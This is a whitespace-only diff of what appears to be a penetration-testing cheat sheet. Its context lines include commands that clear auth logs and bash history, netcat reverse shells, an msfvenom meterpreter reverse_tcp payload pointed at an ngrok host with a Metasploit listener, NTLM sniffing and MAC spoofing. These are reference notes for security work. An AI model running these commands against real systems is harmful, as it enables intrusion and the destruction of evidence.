@@ -40,7 +40,7 @@ unset HISTFILESIZE
 unset HISTSIZE
 TERM=vt100
 export TERM
-echo "" /var/log/auth.log 
+echo "" /var/log/auth.log
 echo '''' -/.bash history
 kill -9 $$
 ln /dev/null -/.bash_history -sf
@@ -402,10 +402,10 @@ The normal use case is  ```testssl.sh <hostname>```.
 Special cases:
 
 ```sh
-testssl.sh --starttls smtp <smtphost>.<tld>:587 
+testssl.sh --starttls smtp <smtphost>.<tld>:587
 testssl.sh --starttls ftp <ftphost>.<tld>:21
-testssl.sh -t xmpp <jabberhost>.<tld>:5222 
-testssl.sh -t xmpp --xmpphost <XMPP domain> <jabberhost>.<tld>:5222 
+testssl.sh -t xmpp <jabberhost>.<tld>:5222
+testssl.sh -t xmpp --xmpphost <XMPP domain> <jabberhost>.<tld>:5222
 testssl.sh --starttls imap <imaphost>.<tld>:143
 ```
 
@@ -465,9 +465,9 @@ sudo tcpdump 'ether host XX:XX:XX:XX:XX:XX' -i en0 -vnt > CheckScan.txt |  tee C
 ## TTL Fingerprinting
 
 ```sh
-Windows : 128 
-Linux : 64 
-Network : 255 
+Windows : 128
+Linux : 64
+Network : 255
 Solaris : 255
 ```
 
@@ -491,7 +491,7 @@ ftp -s:ftp.txt
 ## NetCat Listeners
 
 ```bash
-nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell 
+nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell
 nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
 ```
 
@@ -828,7 +828,7 @@ Various information leak vulnerabilities exist in fingerd implementations. A pop
 
 Login       Name               TTY         Idle    When    Where
 
-root     Super-User            console      <Jun  3 17:22> :0 
+root     Super-User            console      <Jun  3 17:22> :0
 
 admin    Super-User            console      <Jun  3 17:22> :0
 
@@ -923,7 +923,7 @@ Change MAC:
 
 ```sh
 sudo ifconfig <interface-name> down
-sudo ifconfig <interface-name> hw ether <new-mac-address> 
+sudo ifconfig <interface-name> hw ether <new-mac-address>
 sudo ifconfig <interface-name> up
 ```
 
@@ -1086,10 +1086,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19631 -f 
 Start listener:
 
 ```
-use exploit/multi/handler 
-set PAYLOAD windows/meterpreter/reverse_tcp 
-set LHOST 0.0.0.0 set 
-LPORT 9999 
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0 set
+LPORT 9999
 exploit
 ```
 
@@ -1210,7 +1210,7 @@ user RID/GRID:  1090/1091
 Full Name:      Test User
 Home Directory: \\BERSERKER\samba
 HomeDir Drive:  
-Logon Script:   
+Logon Script:  
 Profile Path:   \\BERSERKER\profile
 ```
 
@@ -1235,7 +1235,7 @@ Suppose you have an SSH tunnel, and you want to copy a file to the remote machin
 # This is port forwarding, sending everything from port 31000 on the remote machine to the same port on the local machine
 $ ssh -L 31000:127.0.0.1:31000
 
-# On the remote system: 
+# On the remote system:
 $ ncat -lvnp 31000 127.0.0.1 > file
 
 # On the local system:
@@ -1262,17 +1262,17 @@ $ tshark -i <interface> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u
 # Access information on IP Addresses
 #
 # Color Output
-NC='\033[0m' 
-RED='\033[0;31m'          
+NC='\033[0m'
+RED='\033[0;31m'  
 GREEN='\033[0;32m'
 
 ip=$1
 ipinfo () {
- if [ -z ip ]; then 
+ if [ -z ip ]; then
   echo -e "\n${RED}No IP Address Provided${NC}"
  else
   echo -e "\n${GREEN} IP Information for: $ip ${NC}"
-  curl ipinfo.io/$ip/json 
+  curl ipinfo.io/$ip/json
  fi
 }
 
@@ -1539,7 +1539,7 @@ metadata:
   name: victim-pod
 spec:
   containers:
-  - name: alpine 
+  - name: alpine
     image: alpine
     securityContext:
       readOnlyRootFilesystem: true
@@ -1684,10 +1684,10 @@ if ($retval) {
   echo "Email did not send. Error: " . $retval;
  }
 } else {
- echo 
+ echo
  '<html>
   <head>
-   <style> 
+   <style>
     input[type=submit] {
       background-color: #4CAF50;
       border: none;
@@ -1727,7 +1727,7 @@ if ($retval) {
 
 ```bash
 ┌──(root㉿kali)-[~]
-└─# df /   
+└─# df /  
 Filesystem     1K-blocks     Used Available Use% Mounted on
 /dev/sda1       31861548 16932968  13284548  57% /
 ```
